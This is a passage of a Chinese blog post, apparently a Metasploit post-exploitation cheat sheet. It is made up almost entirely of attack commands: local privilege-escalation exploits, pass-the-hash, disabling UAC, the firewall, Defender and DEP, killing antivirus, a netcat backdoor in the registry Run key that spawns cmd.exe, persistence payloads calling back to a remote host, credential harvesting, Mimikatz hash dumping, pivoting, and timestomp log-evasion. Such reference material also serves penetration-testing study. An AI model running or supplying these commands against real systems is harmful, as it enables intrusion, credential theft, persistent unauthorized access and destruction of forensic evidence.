+<h3 id="3-利用漏洞直接提权为system-注意漏洞的影响范围"><a href="#3-利用漏洞直接提权为system-注意漏洞的影响范围" class="headerlink" title="3.利用漏洞直接提权为system(注意漏洞的影响范围)"></a>3.利用漏洞直接提权为system(注意漏洞的影响范围)</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">– use exploit<span class="hljs-regexp">/windows/</span>local/ms13_053_schlamperei<br><br>– use exploit<span class="hljs-regexp">/windows/</span>local/ms13_081_track_popup_menu<br><br>– use exploit<span class="hljs-regexp">/windows/</span>local/ms13_097_ie_registry_symlink<br><br>– use exploit<span class="hljs-regexp">/windows/</span>local/ppr_flatten_rec<br><br>图形化payload<br><br>– set payload windows<span class="hljs-regexp">/vncinject/</span>reverse_tcp<br><br>– set viewonly no <span class="hljs-comment"># </span><br><br></code></pre></td></tr></table></figure>
+<h3 id="4-Psexec-模块-Passthehash"><a href="#4-Psexec-模块-Passthehash" class="headerlink" title="4.Psexec 模块 Passthehash"></a>4.Psexec 模块 Passthehash</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">– use exploit/windows/smb/psexec<br><br>– set smbpass hash<br><br>在windows的shell命令下<br><br>– 需要提前关闭UAC<br><br>▪ cmd.exe /k <span class="hljs-variable">%windir%</span><span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\r</span>eg.exe ADD HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\S</span>ystem /v EnableLUA /t REG_DWORD /d 0 /f <br><br>▪ cmd.exe /k <span class="hljs-variable">%windir%</span><span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\r</span>eg.exe ADD HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\S</span>ystem /v EnableLUA /t REG_DWORD /d 0 /f<br><br>▪ cmd.exe /k <span class="hljs-variable">%windir%</span><span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\r</span>eg.exe ADD HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\s</span>ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f<br><br>▪ cmd.exe /k <span class="hljs-variable">%windir%</span><span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\r</span>eg.exe ADD HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\s</span>ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f<br><br></code></pre></td></tr></table></figure>
+<h3 id="5-关闭windows-防火墙"><a href="#5-关闭windows-防火墙" class="headerlink" title="5.关闭windows 防火墙"></a>5.关闭windows 防火墙</h3><p><strong>在windows shell命令行下运行</strong></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs gams">– 前提：需要管理员或<span class="hljs-keyword">system</span>权限<br><br>– netsh advfirewall <span class="hljs-keyword">set</span> allprofiles <span class="hljs-comment">state off      ######off</span>是关闭。<span class="hljs-comment">on</span>是打开<br><br>▪ 关闭Windefend<br><br>– net <span class="hljs-comment">stop windefend</span>（利用<span class="hljs-comment">net stop</span>关闭<span class="hljs-comment">windefend</span>服务）<br><br>▪ Bitlocker 磁盘加密<br><br>– manage-bde <span class="hljs-comment">-off C:     off</span>是解密，<span class="hljs-comment">on</span>是加密<br><br>– manage-bde <span class="hljs-comment">-status C:</span><br><br>▪ 关闭DEP（数据执行保护 (DEP) 有助于防止电脑遭受病毒和其他安全威胁的侵害。）<br><br>– bcdedit.exe /set &#123;current&#125; nx AlwaysOff<br><br><br>在meterpreter命令行下执行<br><br>杀死防病毒软件<br><br>Run killav<br><br>也可以利用一个模块，在meterpreter命令行下执行<br><br>run post/<span class="hljs-comment">windows</span>/manage/<span class="hljs-comment">killav</span><br><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="6-开启远程桌面服务"><a href="#6-开启远程桌面服务" class="headerlink" title="6.开启远程桌面服务"></a>6.开启远程桌面服务</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gradle">– run post<span class="hljs-regexp">/windows/m</span>anage/enable_rdp<br><br>▪ run multi_console_command -rc <span class="hljs-regexp">/root/</span>.msf4<span class="hljs-regexp">/logs/</span>scripts<span class="hljs-regexp">/getgui/</span><br><br>clean_up__20160824.<span class="hljs-number">1855</span>.rc<br><br>▪查看远程桌面<br><br>– screenshot<br><br>– use espia<br><br>▪ screengrab<br></code></pre></td></tr></table></figure>
+<h3 id="7-Tokens（用来利用令牌，伪装成其他用户）"><a href="#7-Tokens（用来利用令牌，伪装成其他用户）" class="headerlink" title="7.Tokens（用来利用令牌，伪装成其他用户）"></a>7.Tokens（用来利用令牌，伪装成其他用户）</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs gauss">– 用户每次登陆，帐号绑定临时的<span class="hljs-built_in">Token</span><br><br>– 访问资源时提交<span class="hljs-built_in">Token</span>进行身份验证，类似于WEB Cookie<br><br>– Delegate <span class="hljs-built_in">Token</span>：交互登陆会话<br><br>– Impersonate <span class="hljs-built_in">Token</span>：非交互登陆会话<br><br>– Delegate <span class="hljs-built_in">Token</span>注销后变为Impersonate <span class="hljs-built_in">Token</span>权限依然有效<br><br>▪ Incognito<br><br>list_tokens -u 查看当前的令牌信息<br><br>– 独立功能的软件，被msf集成在metergreter中<br><br>– 无需密码破解或获取密码HASH，窃取<span class="hljs-built_in">Token</span>将自己伪装成其他用户<br><br>– 尤其适用于域环境下提权渗透多操作系统<br><br>令牌利用在域环境攻击中发挥很大作用<br><br>▪ <span class="hljs-keyword">load</span> incognito<br><br>– list_tokens -u<br><br>– impersonate_token lab\administrator<br><br>– 运行以上命令需要getsystem<br><br>本地普通用户需要先本地提权<br><br>▪ <span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/ms10_015_kitrap0d（xp本地提权漏洞）<br><br>▪ execute -f cmd.exe -i -t <span class="hljs-meta"># -t：使用当前假冒toke执行程序</span><br><br>▪ <span class="hljs-built_in">shell</span> <br><br></code></pre></td></tr></table></figure>
+<h3 id="8-利用注册表添加NC后门"><a href="#8-利用注册表添加NC后门" class="headerlink" title="8.利用注册表添加ＮＣ后门"></a>8.利用注册表添加ＮＣ后门</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">upload /usr/share/windows-binaries/nc.exe C:<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>system32<br><br>reg enumkey -k HKLM<span class="hljs-symbol">\\</span>software<span class="hljs-symbol">\\</span>microsoft<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>currentversion<span class="hljs-symbol">\\</span>run<br><br>reg setval -k HKLM<span class="hljs-symbol">\\</span>software<span class="hljs-symbol">\\</span>microsoft<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>currentversion<span class="hljs-symbol">\\</span>run -v nc<br>-d &#x27;C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\n</span>c.exe -Ldp 444 -e cmd.exe&#x27;<br><br>reg queryval -k HKLM<span class="hljs-symbol">\\</span>software<span class="hljs-symbol">\\</span>microsoft<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>currentversion<span class="hljs-symbol">\\</span>Run -　v nc<br></code></pre></td></tr></table></figure>
+<p>我们还需要让防火墙允许我们对开放的端口进行访问</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">execute -f cmd -i -H<br><br>netsh<span class="hljs-built_in"> firewall </span>show opmode<br><br>netsh<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> portopening TCP 4444 <span class="hljs-string">&quot;test&quot;</span> <span class="hljs-builtin-name">ENABLE</span> ALL<br><br>shutdown -r -t 0<br><br>nc 1.1.1.1 4444<br><br></code></pre></td></tr></table></figure>
+<p>其他注册表项目：<a target="_blank" rel="noopener" href="https://support.accessdata.com/hc/en-us/articles/204448155-Registry-Quick-Find-Chart">https://support.accessdata.com/hc/en-us/articles/204448155-Registry-Quick-Find-Chart</a></p>
+<h3 id="9-后渗透阶段的信息收集"><a href="#9-后渗透阶段的信息收集" class="headerlink" title="9.后渗透阶段的信息收集"></a>9.后渗透阶段的信息收集</h3><h4 id="１．抓包"><a href="#１．抓包" class="headerlink" title="１．抓包"></a>１．抓包</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stata">load sniffer<br>sniffer_interfaces<br>sniffer_start 2<br>sniffer_dump 2 1.<span class="hljs-keyword">cap</span><br><br>该sniffer模块可以让我们在内存缓冲区块循环存储抓包（５０００包，对包的数量是有限制的，我们需要及时dump），不会写入硬盘。<br>对包的解码<br>– <span class="hljs-keyword">use</span> auxiliary/sniffer/psnuffle<br>– <span class="hljs-keyword">set</span> PCAPFILE 1.<span class="hljs-keyword">cap</span><br></code></pre></td></tr></table></figure>
+<h4 id="2-文件搜索"><a href="#2-文件搜索" class="headerlink" title="2.文件搜索"></a>2.文件搜索</h4><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">– search -f *.ini<br>– search -d c:<span class="hljs-symbol">\\</span>documents<span class="hljs-symbol">\ </span>and<span class="hljs-symbol">\ </span>settings<span class="hljs-symbol">\\</span>administrator<span class="hljs-symbol">\\</span>desktop<span class="hljs-symbol">\\</span> -f *.docx<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="10-清理痕迹"><a href="#10-清理痕迹" class="headerlink" title="10.清理痕迹"></a>10.清理痕迹</h3><p>最好的避免被电子取证发现的方法：不要碰文件系统</p>
+<p>其实这也是Ｍeterpreter的先天优势所在（完全基于内存）</p>
+<p>ＭＡＣ时间（Ｍodified 修改时间/Accessed 访问时间/Changed 权限修改时间）</p>
+<p>管理员可以通过<strong>ＭＡＣ时间</strong>来判断是否有人入侵并对文件系统进行修改、访问、权限修改操作</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">ls -l --time=atime<span class="hljs-regexp">/mtime/</span>ctime <span class="hljs-number">1</span>.txt　<span class="hljs-regexp">//</span>查看１.txt文件的被人最后一次访问的时间、修改时间、权限修改时间<br><br>stat <span class="hljs-number">1</span>.txt　　　　<span class="hljs-regexp">//</span>Ｌｉｎｕｘ管理员可以通过该命令进行查看<br>touch -d <span class="hljs-string">&quot;2 days ago&quot;</span> <span class="hljs-number">1</span>.txt　　　<span class="hljs-regexp">//</span>攻击者可以通过该命令将该文件的ＡＭ时间进行修改<br>touch -t <span class="hljs-number">1501010101</span> <span class="hljs-number">1</span>.txt　按年月日进行修改，但还是无法修改Ｃ时间<br><br></code></pre></td></tr></table></figure>
+<p>Windows系统的管理员可以通过下图的方法通过时间进行查看文件的情况</p>
+<p><img src="/2020/04/19/metasploit-Framework%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E5%A4%87%E5%BF%98%E5%BD%95/1.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/04/19/metasploit-Framework%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E5%A4%87%E5%BF%98%E5%BD%95/2.png" srcset="/img/loading.gif"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Timestomp (meterpreter)<br><br>timestomp -v <span class="hljs-number">1</span>.txt<br>timestomp -f c:\\autoexec<span class="hljs-selector-class">.bat</span> <span class="hljs-number">1</span>.txt<br>-f 指定模板，可以将你要修改的文件的时间和另一个指定的文件一样<br>-<span class="hljs-selector-tag">b</span> -r　　<span class="hljs-comment">//擦除ＭＡＣＥ时间信息，目前此参数功能失效</span><br>-m / -<span class="hljs-selector-tag">a</span> / -c / -e /　分别对应ＭＡＣＥ时间<br>-z  同时设置所有时间<br>timestomp -z <span class="hljs-string">&quot;MM/DD/YYYY HH(24小时制):MI:SS&quot;</span> <span class="hljs-number">2</span>.txt<br></code></pre></td></tr></table></figure>
+<h3 id="11-Pivoting-跳板-枢纽-支点"><a href="#11-Pivoting-跳板-枢纽-支点" class="headerlink" title="11.Pivoting 跳板/枢纽/支点"></a>11.Pivoting 跳板/枢纽/支点</h3><p>利用已经控制的一台计算机作为入侵内网的跳板</p>
+<p>在其他内网计算机看来，访问全部来自于跳板机</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">run</span><span class="bash"> autoroute -s 1.1.1.0/24</span><br>将目标内网ｉｐ段的路由全部转到我们和一台被攻破的ｓｅｓｓｉｏｎ上<br></code></pre></td></tr></table></figure>
+<h4 id="１．扫描内网"><a href="#１．扫描内网" class="headerlink" title="１．扫描内网"></a>１．扫描内网</h4><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">use auxiliary<span class="hljs-regexp">/scanner/</span>portscan/tcp<br></code></pre></td></tr></table></figure>
+<h4 id="２．端口转发Portfwd"><a href="#２．端口转发Portfwd" class="headerlink" title="２．端口转发Portfwd"></a>２．端口转发Portfwd</h4><p>利用已经被控计算机，在kali与攻击目标之间实现端口转发</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">– portfwd <span class="hljs-builtin-name">add</span> -L LIP -l LPORT -r<span class="hljs-built_in"> RIP </span>-p RPORT<br>– portfwd <span class="hljs-builtin-name">add</span> -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389<br>– portfwd list / delete / flush<br><br><br>然后再攻击内网的机器，就可以用本地ＩＰ<br>use exploit/windows/smb/ms08_067_netapi<br>– <span class="hljs-builtin-name">set</span> RHOST 127.0.0.1<br>– <span class="hljs-builtin-name">set</span> LHOST 2.1.1.10<br>use exploit/multi/handler<br>– <span class="hljs-builtin-name">set</span> exitonsession <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure>
+<h4 id="３．post模块"><a href="#３．post模块" class="headerlink" title="３．post模块"></a>３．post模块</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">POST模块<br><span class="hljs-builtin-name">run</span> post/windows/gather/arp_scanner <span class="hljs-attribute">RHOSTS</span>=2.1.1.0/24<br><span class="hljs-builtin-name">run</span> post/windows/gather/checkvm<br><span class="hljs-builtin-name">run</span> post/windows/gather/credentials/credential_collector<br><span class="hljs-builtin-name">run</span> post/windows/gather/enum_applications<br><span class="hljs-builtin-name">run</span> post/windows/gather/enum_logged_on_users<br><span class="hljs-builtin-name">run</span> post/windows/gather/enum_snmp<br><span class="hljs-builtin-name">run</span> post/multi/recon/local_exploit_suggester<br><span class="hljs-builtin-name">run</span> post/windows/manage/delete_user <span class="hljs-attribute">USERNAME</span>=yuanfh<br><span class="hljs-builtin-name">run</span> post/multi/gather/env<br><span class="hljs-builtin-name">run</span> post/multi/gather/firefox_creds<br><span class="hljs-builtin-name">run</span> post/multi/gather/ssh_creds<br><span class="hljs-builtin-name">run</span> post/multi/gather/check_malware <span class="hljs-attribute">REMOTEFILE</span>=c:\\a.exe<br></code></pre></td></tr></table></figure>
+<h4 id="４．自动执行"><a href="#４．自动执行" class="headerlink" title="４．自动执行"></a>４．自动执行</h4><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">自动执行meterpreter脚本<br>– <span class="hljs-keyword">set</span> AutoRunScript <span class="hljs-comment">hostsedit -e 1.1.1.1,www.baidu.com</span><br>– <span class="hljs-keyword">set</span> <span class="hljs-comment">InitialAutoRunScript checkvm</span><br>自动执行post模块<br>– <span class="hljs-keyword">set</span> <span class="hljs-comment">InitialAutoRunScript migrate -n explorer.exe</span><br>– <span class="hljs-keyword">set</span> <span class="hljs-comment">AutoRunScript post</span>/windows/<span class="hljs-comment">gather</span>/dumplinks<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="１２．持久后门"><a href="#１２．持久后门" class="headerlink" title="１２．持久后门"></a>１２．持久后门</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros">我们利用漏洞取得的meterpreter shell 运行于内存中，重启失效<br>重复exploit漏洞可能造成服务崩溃<br>持久后门保证漏洞修复后扔可远程控制<br><br><br>Meterpreter后门<br><br><span class="hljs-builtin-name">run</span> metsvc -A　　#-r<br>use exploit/multi/handler<br><span class="hljs-builtin-name">set</span> PAYLOAD windows/metsvc_bind_tcp<br><span class="hljs-builtin-name">set</span> LPORT 31337<br><span class="hljs-builtin-name">set</span> RHOST 1.1.1.1<br><br><br>持久后门<br><span class="hljs-builtin-name">run</span> persistence -h<br><span class="hljs-builtin-name">run</span> persistence -X -i 10 -p 4444 -r 1.1.1.1<br><span class="hljs-builtin-name">run</span> persistence -U -i 20 -p 4444 -r 1.1.1.1<br><span class="hljs-builtin-name">run</span> persistence -S -i 20 -p 4444 -r 1.1.1.1<br></code></pre></td></tr></table></figure>
+<h3 id="１３．msf用法延伸之Mimikatz"><a href="#１３．msf用法延伸之Mimikatz" class="headerlink" title="１３．ｍｓｆ用法延伸之Mimikatz"></a>１３．ｍｓｆ用法延伸之Mimikatz</h3><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs lasso">hashdump使用的就是Mimikatz<br><br>getsystem<br>load mimikatz<br>wdigest kerberos msv ssp tspkg livessp<br>mimikatz_command <span class="hljs-params">-h</span><br>mimikatz_command <span class="hljs-params">-f</span> a<span class="hljs-type">::</span><br><span class="hljs-type">mimikatz_command</span> <span class="hljs-params">-f</span> samdump<span class="hljs-type">::hashes</span><br>mimikatz_command <span class="hljs-params">-f</span> <span class="hljs-keyword">handle</span><span class="hljs-type">::list</span><br>mimikatz_command <span class="hljs-params">-f</span> service<span class="hljs-type">::list</span><br>mimikatz_command <span class="hljs-params">-f</span> crypto<span class="hljs-type">::listProviders</span><br>mimikatz_command <span class="hljs-params">-f</span> winmine<span class="hljs-type">::infos</span><br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/kali/">kali</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/metasploit/">metasploit</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/04/19/%E5%85%B3%E4%BA%8E%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1%E7%9A%84BIF%EF%BC%88%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%EF%BC%89/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">关于类和对象的BIF（内置函数）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/04/19/kali%E5%AD%A6%E4%B9%A0-NETCAT/">
+                        <span class="hidden-mobile">[kali学习]NETCAT</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
